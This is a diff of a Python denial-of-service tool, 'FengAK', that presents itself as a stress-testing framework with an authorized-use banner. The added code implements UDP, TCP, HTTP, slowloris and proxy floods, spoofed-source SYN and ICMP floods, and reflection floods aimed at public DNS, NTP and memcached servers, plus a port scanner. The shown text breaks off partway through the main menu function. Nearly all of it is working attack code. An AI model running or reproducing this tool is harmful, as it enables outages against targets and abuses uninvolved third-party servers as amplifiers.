@@ -1,250 +1,332 @@
-import os
 import sys
-import json
+import os
 import time
-import random
 import socket
-import struct
+import random
 import threading
+import json
 from datetime import datetime
+from socket import gethostbyname
 
 try:
-    from scapy.all import IP, TCP, UDP, ICMP, sr1, send
+    from scapy.all import IP, TCP, ICMP, UDP, send, sr1, Raw
     SCAPY_AVAILABLE = True
 except ImportError:
     SCAPY_AVAILABLE = False
 
-MAX_PACKET_SIZE = 65507
+class C:
+    R = "\033[0m"
+    B = "\033[1m"
+    D = "\033[2m"
+    RED = "\033[91m"
+    GRN = "\033[92m"
+    YEL = "\033[93m"
+    BLU = "\033[94m"
+    MAG = "\033[95m"
+    CYN = "\033[96m"
+    WHT = "\033[97m"
 
-class AttackStats:
+USER_AGENTS = [
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
+    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
+]
+
+class Stats:
     def __init__(self):
-        self.running = False
-        self.start_time = 0
         self.sent = 0
-        self.bytes_sent = 0
-        self.peak_qps = 0
+        self.bytes = 0
+        self.start = None
+        self.lock = threading.Lock()
+        self.running = False
+        self.limit = None
+        self.peak = 0
         self.errors = 0
-        self.threads = 0
-        self._lock = threading.Lock()
-        self._last_count = 0
-        self._last_time = 0
-        self._last_bytes = 0
-        self._last_bw_time = 0
 
-    def add_packet(self, size=0):
-        with self._lock:
-            self.sent += 1
-            self.bytes_sent += size
-
-    def add_error(self):
-        with self._lock:
-            self.errors += 1
+    def inc(self, count=1, size=0):
+        with self.lock:
+            self.sent += count
+            self.bytes += size
 
     def get_sent(self):
-        with self._lock:
+        with self.lock:
             return self.sent
 
     def get_bytes(self):
-        with self._lock:
-            return self.bytes_sent
+        with self.lock:
+            return self.bytes
 
-    def get_elapsed(self):
-        return time.time() - self.start_time
+    def elapsed(self):
+        return time.time() - self.start if self.start else 0
 
-    def get_qps(self):
-        now = time.time()
-        with self._lock:
-            dt = now - self._last_time if self._last_time else 1
-            if dt <= 0:
-                dt = 1
-            qps = (self.sent - self._last_count) / dt
-            self._last_count = self.sent
-            self._last_time = now
-            if qps > self.peak_qps:
-                self.peak_qps = qps
-            return qps
+    def qps(self):
+        e = self.elapsed()
+        if e > 1:
+            q = self.get_sent() / e
+            if q > self.peak:
+                self.peak = q
+            return q
+        return 0
 
-    def get_bandwidth(self):
-        now = time.time()
-        with self._lock:
-            dt = now - self._last_bw_time if self._last_bw_time else 1
-            if dt <= 0:
-                dt = 1
-            bw = (self.bytes_sent - self._last_bytes) / dt / 1024 / 1024
-            self._last_bytes = self.bytes_sent
-            self._last_bw_time = now
-            return bw
+    def bw(self):
+        e = self.elapsed()
+        return self.get_bytes() / e / 1024 / 1024 if e > 1 else 0
 
-stats = AttackStats()
+    def check(self):
+        if self.limit and self.elapsed() >= self.limit:
+            self.running = False
+            return False
+        return True
 
-class Color:
-    RED = "\033[91m"
-    GREEN = "\033[92m"
-    YELLOW = "\033[93m"
-    BLUE = "\033[94m"
-    MAGENTA = "\033[95m"
-    CYAN = "\033[96m"
-    BOLD = "\033[1m"
-    DIM = "\033[2m"
-    RESET = "\033[0m"
+stats = Stats()
 
-color = Color()
+def fmt_bytes(n):
+    if n < 1024: return f"{n} B"
+    if n < 1024**2: return f"{n/1024:.2f} KB"
+    if n < 1024**3: return f"{n/1024**2:.2f} MB"
+    return f"{n/1024**3:.2f} GB"
 
-def format_number(n):
-    if n >= 1_000_000:
-        return f"{n / 1_000_000:.1f}M"
-    if n >= 1_000:
-        return f"{n / 1_000:.1f}K"
-    return str(n)
+def fmt_num(n):
+    if n >= 1_000_000: return f"{n/1_000_000:.1f}M"
+    if n >= 1000: return f"{n/1000:.1f}K"
+    return str(int(n))
 
-def format_bytes(b):
-    if b >= 1_073_741_824:
-        return f"{b / 1_073_741_824:.2f} GB"
-    if b >= 1_048_576:
-        return f"{b / 1_048_576:.2f} MB"
-    if b >= 1024:
-        return f"{b / 1024:.2f} KB"
-    return f"{b} B"
+def banner():
+    os.system("clear")
+    print(f"""{C.CYN}{C.B}
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                                                              ║
+    ║   {C.MAG}███████╗███████╗███╗   ██╗ ██████╗ {C.CYN}                       ║
+    ║   {C.MAG}██╔════╝██╔════╝████╗  ██║██╔════╝ {C.CYN}                       ║
+    ║   {C.MAG}█████╗  █████╗  ██╔██╗ ██║██║  ███╗{C.CYN}                       ║
+    ║   {C.MAG}██╔══╝  ██╔══╝  ██║╚██╗██║██║   ██║{C.CYN}                       ║
+    ║   {C.MAG}██║     ███████╗██║ ╚████║╚██████╔╝{C.CYN}                       ║
+    ║   {C.MAG}╚═╝     ╚══════╝╚═╝  ╚═══╝ ╚═════╝ {C.CYN}                       ║
+    ║                                                              ║
+    ║   {C.WHT}FengAK vS2.0{C.CYN}  {C.D}Network Stress Testing Framework{C.CYN}           ║
+    ║                                                              ║
+    ╠══════════════════════════════════════════════════════════════╣
+    ║   {C.D}AUTHOR :{C.WHT} FengPwner{C.CYN}                                      ║
+    ║   {C.D}GITHUB :{C.WHT} github.com/FengPwner{C.CYN}                            ║
+    ║   {C.D}ATOMGIT:{C.WHT} atomgit.com/FengPwner{C.CYN}                           ║
+    ║   {C.D}CSDN   :{C.WHT} blog.csdn.net/2302_76189356{C.CYN}                     ║
+    ╠══════════════════════════════════════════════════════════════╣
+    ║   {C.RED}{C.B}⚠  FOR AUTHORIZED TESTING ONLY - DO NOT USE ILLEGALLY  ⚠{C.CYN}   ║
+    ╚══════════════════════════════════════════════════════════════╝{C.R}
+""")
 
-def udp_flood(target_ip, target_port, packet_size):
+def panel(title, lines, col=C.CYN):
+    w = 58
+    print(f"{col}┌{'─'*w}┐{C.R}")
+    print(f"{col}│{C.R} {C.B}{title.center(w)}{C.R} {col}│{C.R}")
+    print(f"{col}├{'─'*w}┤{C.R}")
+    for l in lines:
+        print(f"{col}│{C.R} {l.ljust(w)} {col}│{C.R}")
+    print(f"{col}└{'─'*w}┘{C.R}")
+
+def status_bar(ip, port, mode):
+    e = stats.elapsed()
+    m, s = int(e // 60), int(e % 60)
+    pw = 16
+    p = min(e / 300, 1.0) if stats.limit else min(e / 60, 1.0)
+    f = int(pw * p)
+    bar = "█" * f + "░" * (pw - f)
+    print(
+        f"\r{C.CYN}◈ {ip}:{port} {mode.upper():<10}{C.R} "
+        f"{C.YEL}[{bar}]{C.R} {m:02d}:{s:02d}  "
+        f"{C.GRN}{fmt_num(stats.get_sent()):>7} pkt  {fmt_num(stats.qps()):>5} qps  "
+        f"{stats.bw():.1f}MB/s{C.R}\033[K",
+        end="", flush=True
+    )
+
+def verify(ip, port, iv=10):
+    while stats.running:
+        st, det, lat = "UNKNOWN", "", 0
+        if SCAPY_AVAILABLE:
+            try:
+                sp = random.randint(1024, 65535)
+                t0 = time.time()
+                r = sr1(IP(dst=ip)/TCP(dport=port, sport=sp, flags="S"), timeout=3, verbose=False)
+                lat = (time.time() - t0) * 1000
+                if r is None:
+                    st, det = "NO_REPLY", "filtered"
+                elif r.haslayer(TCP):
+                    fl = r[TCP].flags
+                    if fl & 0x12: st, det = "OPEN", "SYN+ACK"
+                    elif fl & 0x14: st, det = "CLOSED", "RST"
+                    else: st, det = "REPLIED", f"flags={fl}"
+                elif r.haslayer(ICMP):
+                    st, det = ("UNREACHABLE", "ICMP unreach") if r[ICMP].type == 3 else ("ICMP", f"type={r[ICMP].type}")
+                else:
+                    st, det = "REPLIED", r.summary()
+            except Exception as ex:
+                st, det = "ERROR", str(ex)
+        else:
+            try:
+                sk = socket.socket()
+                sk.settimeout(3)
+                t0 = time.time()
+                sk.connect((ip, port))
+                lat = (time.time() - t0) * 1000
+                st, det = "OPEN", "TCP connected"
+                sk.close()
+            except ConnectionRefusedError:
+                st, det = "CLOSED", "refused"
+            except socket.timeout:
+                st, det = "TIMEOUT", "no response"
+            except OSError as ex:
+                st, det = "ERROR", str(ex)
+        c = {"OPEN": C.GRN, "CLOSED": C.YEL, "UNREACHABLE": C.RED, "TIMEOUT": C.YEL,
+             "NO_REPLY": C.YEL, "ERROR": C.RED, "REPLIED": C.CYN, "ICMP": C.MAG}.get(st, C.WHT)
+        print(f"\n{c}[{datetime.now():%H:%M:%S}] ◈ {ip}:{port} → {st} ({det}) [{lat:.0f}ms]{C.R}")
+        time.sleep(iv)
+
+def udp_flood(ip, port, size):
     while stats.running:
         try:
-            payload = generate_random_payload(packet_size)
-            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            s.sendto(payload, (target_ip, target_port))
-            s.close()
-            stats.add_packet(len(payload))
+            sk = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            d = random._urandom(size)
+            sk.sendto(d, (ip, port))
+            stats.inc(1, len(d))
+            sk.close()
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def tcp_flood(target_ip, target_port, packet_size):
+def tcp_flood(ip, port, size):
     while stats.running:
         try:
-            payload = generate_random_payload(packet_size)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((target_ip, target_port))
-            s.send(payload)
-            s.close()
-            stats.add_packet(len(payload))
+            sk = socket.socket()
+            sk.settimeout(1)
+            sk.connect((ip, port))
+            d = random._urandom(size)
+            sk.sendall(d)
+            stats.inc(1, len(d))
+            sk.close()
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def syn_flood(target_ip, target_port, packet_size):
-    if not SCAPY_AVAILABLE:
-        return tcp_flood(target_ip, target_port, packet_size)
+def syn_flood(ip, port, size):
+    if not SCAPY_AVAILABLE: return
     while stats.running:
         try:
-            pkt = IP(dst=target_ip) / TCP(dport=target_port, flags="S")
-            send(pkt, verbose=False)
-            stats.add_packet(packet_size)
+            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+            p = IP(src=sip, dst=ip)/TCP(sport=random.randint(1024,65535), dport=port, flags="S")/Raw(load=random._urandom(size))
+            send(p, verbose=False)
+            stats.inc(1, size)
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def icmp_flood(target_ip, target_port, packet_size):
-    if not SCAPY_AVAILABLE:
-        return
+def icmp_flood(ip, port, size):
+    if not SCAPY_AVAILABLE: return
     while stats.running:
         try:
-            pkt = IP(dst=target_ip) / ICMP() / generate_random_payload(packet_size)
-            send(pkt, verbose=False)
-            stats.add_packet(packet_size)
+            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+            p = IP(src=sip, dst=ip)/ICMP()/Raw(load=random._urandom(size))
+            send(p, verbose=False)
+            stats.inc(1, size)
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def http_flood(target_ip, target_port, packet_size):
+def http_flood(ip, port, size):
     while stats.running:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(1)
-            s.connect((target_ip, target_port))
-            req = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
-            s.send(req.encode())
-            s.close()
-            stats.add_packet(len(req))
+            sk = socket.socket()
+            sk.settimeout(2)
+            sk.connect((ip, port))
+            req = (
+                f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n"
+                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
+                f"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n"
+                f"Connection: keep-alive\r\n\r\n"
+            )
+            sk.send(req.encode())
+            stats.inc(1, len(req))
+            sk.close()
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def dns_amplification(target_ip, target_port, packet_size):
-    if not SCAPY_AVAILABLE:
-        return udp_flood(target_ip, target_port, packet_size)
+def dns_amp(ip, port, size):
+    if not SCAPY_AVAILABLE: return
+    servers = ["8.8.8.8", "8.8.4.4", "1.1.1.1", "208.67.222.222"]
     while stats.running:
         try:
-            pkt = IP(dst=target_ip) / UDP(dport=53) / b"\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01"
-            send(pkt, verbose=False)
-            stats.add_packet(packet_size)
+            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+            p = IP(src=sip, dst=random.choice(servers))/UDP(sport=random.randint(1024,65535), dport=53)/Raw(load=random._urandom(size))
+            send(p, verbose=False)
+            stats.inc(1, size)
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def proxy_flood(target_ip, target_port, packet_size, proxy_list):
-    while stats.running:
-        proxy = random.choice(proxy_list)
-        try:
-            ph, pp = proxy.split(":")
-            pp = int(pp)
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(2)
-            s.connect((ph, pp))
-            req = f"GET http://{target_ip}:{target_port}/ HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
-            s.send(req.encode())
-            s.close()
-            stats.add_packet(len(req))
-        except Exception:
-            stats.add_error()
-
-def slowloris_flood(target_ip, target_port, packet_size):
+def proxy_flood(ip, port, size, proxies):
     while stats.running:
         try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
-            s.connect((target_ip, target_port))
-            s.send(b"GET / HTTP/1.1\r\n")
-            time.sleep(2)
-            s.send(b"X-a: b\r\n")
-            time.sleep(2)
-            s.close()
-            stats.add_packet(packet_size)
+            ph, pp = random.choice(proxies).split(":")
+            sk = socket.socket()
+            sk.settimeout(2)
+            sk.connect((ph, int(pp)))
+            sk.send(f"CONNECT {ip}:{port} HTTP/1.1\r\nHost: {ip}:{port}\r\n\r\n".encode())
+            if b"200" in sk.recv(1024):
+                d = random._urandom(size)
+                sk.send(d)
+                stats.inc(1, len(d))
+            sk.close()
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def ntp_amplification(target_ip, target_port, packet_size):
-    if not SCAPY_AVAILABLE:
-        return udp_flood(target_ip, target_port, packet_size)
+def slowloris(ip, port, size):
     while stats.running:
         try:
-            pkt = IP(dst=target_ip) / UDP(dport=123) / b"\x17\x00\x03\x2a" + b"\x00" * (packet_size - 4)
-            send(pkt, verbose=False)
-            stats.add_packet(packet_size)
+            sk = socket.socket()
+            sk.settimeout(5)
+            sk.connect((ip, port))
+            sk.send(b"GET / HTTP/1.1\r\n")
+            sk.send(f"Host: {ip}\r\n".encode())
+            sk.send(b"User-Agent: Mozilla/5.0\r\nContent-Length: 10000\r\nConnection: keep-alive\r\n")
+            time.sleep(0.1)
+            sk.send(b"X-a: b\r\n")
+            stats.inc(1, 100)
+            time.sleep(5)
+            sk.close()
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def memcached_amplification(target_ip, target_port, packet_size):
-    if not SCAPY_AVAILABLE:
-        return udp_flood(target_ip, target_port, packet_size)
+def ntp_amp(ip, port, size):
+    if not SCAPY_AVAILABLE: return
+    servers = ["129.6.15.28", "129.6.15.29", "132.163.4.101", "132.163.4.102"]
     while stats.running:
         try:
-            pkt = IP(dst=target_ip) / UDP(dport=11211) / b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n"
-            send(pkt, verbose=False)
-            stats.add_packet(packet_size)
+            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+            payload = b"\x17\x00\x03\x2a" + b"\x00" * 44
+            p = IP(src=sip, dst=random.choice(servers))/UDP(sport=random.randint(1024,65535), dport=123)/Raw(load=payload)
+            send(p, verbose=False)
+            stats.inc(1, len(payload))
         except Exception:
-            stats.add_error()
+            stats.errors += 1
+        if not stats.check(): break
 
-def generate_random_payload(size):
-    patterns = [
-        lambda s: random._urandom(s),
-        lambda s: b"A" * s,
-        lambda s: b"\x00" * s,
-        lambda s: (b"PAYLOAD" * (s // 7 + 1))[:s],
-        lambda s: bytes([random.randint(0, 255) for _ in range(min(s, 65507))]),
-    ]
-    return random.choice(patterns)(size)
-
-def load_config(config_file):
-    try:
-        with open(config_file, "r") as f:
-            return json.load(f)
-    except Exception:
-        return {}
+def memcached_amp(ip, port, size):
+    if not SCAPY_AVAILABLE: return
+    while stats.running:
+        try:
+            sip = f"{random.randint(1,254)}.{random.randint(0,254)}.{random.randint(0,254)}.{random.randint(1,254)}"
+            p = IP(src=sip, dst=random.choice(["1.1.1.1", "2.2.2.2"]))/UDP(sport=random.randint(1024,65535), dport=11211)/Raw(load=b"\x00\x01\x00\x00\x00\x01\x00\x00stats\r\n")
+            send(p, verbose=False)
+            stats.inc(1, size)
+        except Exception:
+            stats.errors += 1
+        if not stats.check(): break
 
 def save_log(entry):
     try:
@@ -253,263 +335,224 @@ def save_log(entry):
     except Exception:
         pass
 
-def monitor_stats(target_ip, target_port, mode):
+def scan(ip, ports, to=1):
+    out = []
+    for p in ports:
+        try:
+            sk = socket.socket()
+            sk.settimeout(to)
+            out.append((p, "OPEN" if sk.connect_ex((ip, p)) == 0 else "CLOSED"))
+            sk.close()
+        except Exception:
+            out.append((p, "ERROR"))
+    return out
+
+def monitor(ip, port, mode):
     while stats.running:
-        print_status_panel(stats, target_ip, target_port, mode)
+        status_bar(ip, port, mode)
         time.sleep(1)
 
-def run_attack(target_ip, target_port, mode, threads, proxy_list=None):
+def run(ip, port, mode, size, threads, proxies=None, dur=None):
     stats.running = True
-    stats.start_time = time.time()
-    stats.peak_qps = 0
+    stats.start = time.time()
+    stats.limit = dur
+    stats.peak = 0
     stats.errors = 0
-    stats.threads = threads
-    packet_size = MAX_PACKET_SIZE
 
-    mode_map = {
-        "udp": udp_flood,
-        "tcp": tcp_flood,
-        "syn": syn_flood,
-        "icmp": icmp_flood,
-        "http": http_flood,
-        "dns": dns_amplification,
-        "proxy": proxy_flood,
-        "slowloris": slowloris_flood,
-        "ntp": ntp_amplification,
-        "memcached": memcached_amplification,
-    }
-    attack_func = mode_map.get(mode)
-    if not attack_func:
-        print(f"{color.RED}[-] Unknown attack mode: {mode}{color.RESET}")
+    fns = {"udp": udp_flood, "tcp": tcp_flood, "syn": syn_flood, "icmp": icmp_flood,
+           "http": http_flood, "dns": dns_amp, "proxy": proxy_flood,
+           "slowloris": slowloris, "ntp": ntp_amp, "memcached": memcached_amp}
+    fn = fns.get(mode)
+    if not fn:
+        print(f"{C.RED}[-] Unknown mode: {mode}{C.R}")
         return
-    if mode == "proxy" and not proxy_list:
-        print(f"{color.RED}[-] Proxy mode requires a non-empty proxy list. Aborting.{color.RESET}")
+    if mode == "proxy" and not proxies:
+        print(f"{C.RED}[-] Proxy mode needs a proxy list.{C.R}")
         return
 
-    monitor_thread = threading.Thread(target=monitor_stats, args=(target_ip, target_port, mode), daemon=True)
-    monitor_thread.start()
+    threading.Thread(target=monitor, args=(ip, port, mode), daemon=True).start()
+    threading.Thread(target=verify, args=(ip, port, 10), daemon=True).start()
 
-    attack_threads = []
+    pool = []
     for _ in range(threads):
-        if mode == "proxy":
-            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size, proxy_list))
-        else:
-            t = threading.Thread(target=attack_func, args=(target_ip, target_port, packet_size))
-        t.daemon = True
+        args = (ip, port, size, proxies) if mode == "proxy" else (ip, port, size)
+        t = threading.Thread(target=fn, args=args, daemon=True)
         t.start()
-        attack_threads.append(t)
+        pool.append(t)
 
     try:
         while stats.running:
+            if not stats.check():
+                print(f"\n{C.YEL}[!] Duration limit reached ({dur}s).{C.R}")
+                break
             time.sleep(0.5)
     except KeyboardInterrupt:
-        print(f"\n{color.YELLOW}[!] Attack interrupted by user.{color.RESET}")
+        print(f"\n{C.YEL}[!] Interrupted.{C.R}")
 
     stats.running = False
-    for t in attack_threads:
+    for t in pool:
         t.join(timeout=2)
 
-    elapsed = stats.get_elapsed()
-    entry = {
-        "time": datetime.now().isoformat(),
-        "target": f"{target_ip}:{target_port}",
-        "mode": mode,
-        "threads": threads,
-        "sent": stats.get_sent(),
-        "bytes": stats.get_bytes(),
-        "elapsed": elapsed,
-        "errors": stats.errors,
-        "peak_qps": stats.peak_qps,
-    }
-    save_log(entry)
+    e = stats.elapsed()
+    sent = stats.get_sent()
+    save_log({"time": datetime.now().isoformat(), "target": f"{ip}:{port}", "mode": mode,
+              "threads": threads, "sent": sent, "bytes": stats.get_bytes(),
+              "elapsed": e, "errors": stats.errors, "peak_qps": stats.peak})
 
-    print(f"\n{color.GREEN}{'─' * 50}{color.RESET}")
-    print(f"{color.GREEN}{color.BOLD}ATTACK SUMMARY{color.RESET}")
-    print(f"{color.GREEN}{'─' * 50}{color.RESET}")
-    print(f"  Total Sent : {format_number(stats.get_sent())}")
-    print(f"  Total Data : {format_bytes(stats.get_bytes())}")
-    print(f"  Duration   : {elapsed:.1f}s")
-    print(f"  Peak QPS   : {format_number(stats.peak_qps)}")
-    print(f"  Errors     : {stats.errors}")
-    print(f"{color.GREEN}{'─' * 50}{color.RESET}")
+    w = 58
+    print(f"\n{C.GRN}╔{'═'*w}╗{C.R}")
+    print(f"{C.GRN}║{C.R} {C.B}{'ATTACK SUMMARY'.center(w)}{C.R} {C.GRN}║{C.R}")
+    print(f"{C.GRN}╠{'═'*w}╣{C.R}")
+    for k, v in [("Target", f"{ip}:{port}"), ("Mode", mode.upper()), ("Threads", threads),
+                 ("Packets Sent", fmt_num(sent)), ("Data Sent", fmt_bytes(stats.get_bytes())),
+                 ("Duration", f"{e:.1f}s"), ("Peak QPS", fmt_num(stats.peak)),
+                 ("Errors", stats.errors)]:
+        print(f"{C.GRN}║{C.R} {k:<16}{C.D}:{C.R} {v:<{w-19}} {C.GRN}║{C.R}")
+    print(f"{C.GRN}╚{'═'*w}╝{C.R}")
 
-def handle_error(allow_edit=True):
+def prompt_err(edit=True):
     while True:
-        if allow_edit:
-            choice = input(f"{color.YELLOW}[?] Return to menu (y), Exit (n), or Edit (e): {color.RESET}").strip().lower()
-            if choice == 'y': return 'y'
-            elif choice == 'n':
-                print(f"{color.GREEN}[*] Exiting script. Goodbye!{color.RESET}")
-                sys.exit(0)
-            elif choice == 'e': return 'e'
-            else: print(f"{color.RED}[-] Invalid input. Please enter 'y', 'n', or 'e'.{color.RESET}")
-        else:
-            choice = input(f"{color.YELLOW}[?] Return to menu (y) or Exit (n): {color.RESET}").strip().lower()
-            if choice == 'y': return 'y'
-            elif choice == 'n':
-                print(f"{color.GREEN}[*] Exiting. Stay ethical.{color.RESET}")
-                sys.exit(0)
-            else: print(f"{color.RED}[-] Invalid input. Please enter 'y' or 'n'.{color.RESET}")
+        opts = "(y) menu / (n) exit / (e) edit" if edit else "(y) menu / (n) exit"
+        ch = input(f"{C.YEL}[?] {opts}: {C.R}").strip().lower()
+        if ch == 'y': return 'y'
+        if ch == 'n':
+            print(f"{C.GRN}[*] Goodbye!{C.R}")
+            sys.exit(0)
+        if ch == 'e' and edit: return 'e'
+        print(f"{C.RED}[-] Invalid choice.{C.R}")
 
-def load_proxies(proxy_file):
-    proxies = []
+def load_proxies(path):
+    out = []
     try:
-        with open(proxy_file, "r") as f:
+        with open(path) as f:
             for line in f:
                 line = line.strip()
                 if line and ":" in line:
-                    proxies.append(line)
+                    out.append(line)
     except FileNotFoundError:
-        print(f"{color.RED}[-] Proxy file not found: {proxy_file}{color.RESET}")
-    return proxies
+        print(f"{C.RED}[-] File not found: {path}{C.R}")
+    return out
 
-def validate_proxies(proxy_list, timeout=2):
-    valid = []
-    print(f"{color.CYAN}[*] Validating {len(proxy_list)} proxies...{color.RESET}")
-    for p in proxy_list:
+def validate_proxies(lst, to=2):
+    ok = []
+    print(f"{C.CYN}[*] Validating {len(lst)} proxies...{C.R}")
+    for p in lst:
         try:
-            host, port = p.split(":")
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(timeout)
-            if s.connect_ex((host, int(port))) == 0:
-                valid.append(p)
-            s.close()
+            h, pt = p.split(":")
+            sk = socket.socket()
+            sk.settimeout(to)
+            if sk.connect_ex((h, int(pt))) == 0:
+                ok.append(p)
+            sk.close()
         except Exception:
             pass
-    print(f"{color.GREEN}[+] {len(valid)} / {len(proxy_list)} proxies are alive.{color.RESET}")
-    return valid
-
-def print_status_panel(stats_obj, target_ip, target_port, mode):
-    elapsed = stats_obj.get_elapsed()
-    minutes = int(elapsed // 60)
-    seconds = int(elapsed % 60)
-    qps = stats_obj.get_qps()
-    bw = stats_obj.get_bandwidth()
-
-    lines = [
-        f"{color.CYAN}{'─' * 50}{color.RESET}",
-        f"{color.BOLD}FengAK LIVE{color.RESET}  {color.DIM}{datetime.now().strftime('%H:%M:%S')}{color.RESET}",
-        f"{color.DIM}TARGET{color.RESET} {target_ip}:{target_port}   {color.DIM}MODE{color.RESET} {mode.upper()}",
-        f"{color.DIM}TIME{color.RESET}   {minutes:02d}:{seconds:02d}   {color.DIM}THREADS{color.RESET} {stats_obj.threads}",
-        f"{color.GREEN}SENT{color.RESET}   {format_number(stats_obj.get_sent()):>8}   {color.GREEN}QPS{color.RESET}   {format_number(qps):>8}",
-        f"{color.YELLOW}DATA{color.RESET}   {format_bytes(stats_obj.get_bytes()):>8}   {color.YELLOW}BW{color.RESET}   {bw:.2f} MB/s",
-        f"{color.MAGENTA}PEAK{color.RESET}   {format_number(stats_obj.peak_qps):>8}   {color.RED}ERR{color.RESET}   {stats_obj.errors:>8}",
-        f"{color.CYAN}{'─' * 50}{color.RESET}",
-    ]
-
-    print("\033[" + str(len(lines)) + "A\033[J", end="")
-    print("\n".join(lines), flush=True)
-
-def resolve_target(target):
-    try:
-        ip = socket.gethostbyname(target)
-        print(f"{color.GREEN}[+] Resolved {target} -> {ip}{color.RESET}")
-        return ip
-    except socket.gaierror:
-        print(f"{color.RED}[-] Could not resolve domain: {target}{color.RESET}")
-        return None
-
-def show_banner():
-    os.system("clear")
-    os.system("figlet FengAK")
-    print(f"{color.CYAN}┌{'─' * 58}┐{color.RESET}")
-    print(f"{color.CYAN}│{color.RESET} {color.BOLD}FengAK{color.RESET}  {color.MAGENTA}v0.6.0{color.RESET}  {color.DIM}Network Stress Testing Framework{color.RESET}")
-    print(f"{color.CYAN}├{'─' * 58}┤{color.RESET}")
-    print(f"{color.CYAN}│{color.RESET} {color.DIM}AUTHOR :{color.RESET} FengPwner")
-    print(f"{color.CYAN}│{color.RESET} {color.DIM}GITHUB :{color.RESET} github.com/FengPwner")
-    print(f"{color.CYAN}│{color.RESET} {color.DIM}ATOMGIT:{color.RESET} atomgit.com/FengPwner")
-    print(f"{color.CYAN}│{color.RESET} {color.DIM}CSDN   :{color.RESET} blog.csdn.net/2302_76189356")
-    print(f"{color.CYAN}└{'─' * 58}┘{color.RESET}")
-    print(f"{color.RED}{color.BOLD}  ⚠  FOR AUTHORIZED TESTING ONLY - DO NOT USE ILLEGALLY  ⚠{color.RESET}\n")
-
-def show_menu():
-    print(f"{color.CYAN}{'=' * 58}{color.RESET}")
-    print(f"{color.BOLD}  Attack Modes:{color.RESET}")
-    print(f"{color.CYAN}{'=' * 58}{color.RESET}")
-    print(f"  {color.GREEN}1{color.RESET}. UDP Flood          {color.GREEN}2{color.RESET}. TCP Flood")
-    print(f"  {color.GREEN}3{color.RESET}. SYN Flood          {color.GREEN}4{color.RESET}. ICMP Flood")
-    print(f"  {color.GREEN}5{color.RESET}. HTTP Flood         {color.GREEN}6{color.RESET}. DNS Amplification")
-    print(f"  {color.GREEN}7{color.RESET}. Proxy Flood        {color.GREEN}8{color.RESET}. Slowloris")
-    print(f"  {color.GREEN}9{color.RESET}. NTP Amplification  {color.GREEN}10{color.RESET}. Memcached Amplification")
-    print(f"{color.CYAN}{'=' * 58}{color.RESET}")
-    print(f"  {color.YELLOW}0{color.RESET}. Exit")
-    print(f"{color.CYAN}{'=' * 58}{color.RESET}")
+    print(f"{C.GRN}[+] {len(ok)}/{len(lst)} alive.{C.R}")
+    return ok
 
 def main():
-    show_banner()
-    config = load_config("config.json")
-
+    modes = ["udp", "tcp", "syn", "icmp", "http", "dns", "proxy", "slowloris", "ntp", "memcached"]
     while True:
-        show_menu()
-        choice = input(f"{color.CYAN}[?] Select mode (0-10): {color.RESET}").strip()
-
-        mode_map = {
-            "1": "udp", "2": "tcp", "3": "syn", "4": "icmp",
-            "5": "http", "6": "dns", "7": "proxy", "8": "slowloris",
-            "9": "ntp", "10": "memcached",
-        }
-
-        if choice == "0":
-            print(f"{color.GREEN}[*] Exiting. Stay ethical.{color.RESET}")
-            break
-
-        if choice not in mode_map:
-            print(f"{color.RED}[-] Invalid choice.{color.RESET}")
-            continue
-
-        mode = mode_map[choice]
